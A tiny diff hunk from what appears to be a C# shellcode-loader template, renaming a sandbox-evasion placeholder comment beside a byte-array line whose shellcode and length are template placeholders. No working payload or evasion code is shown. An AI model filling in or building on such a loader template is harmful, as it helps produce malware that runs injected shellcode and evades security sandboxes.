@@ -773,7 +773,7 @@ namespace mySharphalo
         public static void Main(string[] args)
         {
 
-            //####SANDBOXEVASION####
+            //####EVASION####
             
             byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
 
